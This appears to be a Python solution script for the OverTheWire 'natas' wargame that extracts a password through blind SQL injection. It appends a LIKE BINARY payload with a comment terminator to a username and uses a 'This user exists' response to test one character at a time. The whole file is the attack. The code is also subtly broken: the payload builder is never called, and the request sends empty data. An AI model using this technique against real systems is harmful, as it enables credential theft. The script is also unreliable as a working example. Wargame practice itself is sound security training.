"""Cracking natas password!
"""

# Third party import
from requests import post

# Local imports
from variables import auth, URL, CHARS, NAME

# Variables
password = ""


def query_generator(currect_password: str, character: str) -> str:
    return f'{NAME}{" AND password LIKE BINARY "}{currect_password}{character}%%" -- '


def get_respones(character: str) -> str:
    """get respones of url with data and auth

    Args:
        character (str): testing character

    Returns:
        str: return character if currect and '' if not currect
    """
    respones = post(URL, data={}, auth=auth)
    if "This user exists" in respones.text:
        return character
    return ''


while len(password) <= 32:
    for test_char in CHARS:
        char = get_respones(test_char)
        if char:
            password += char
            break
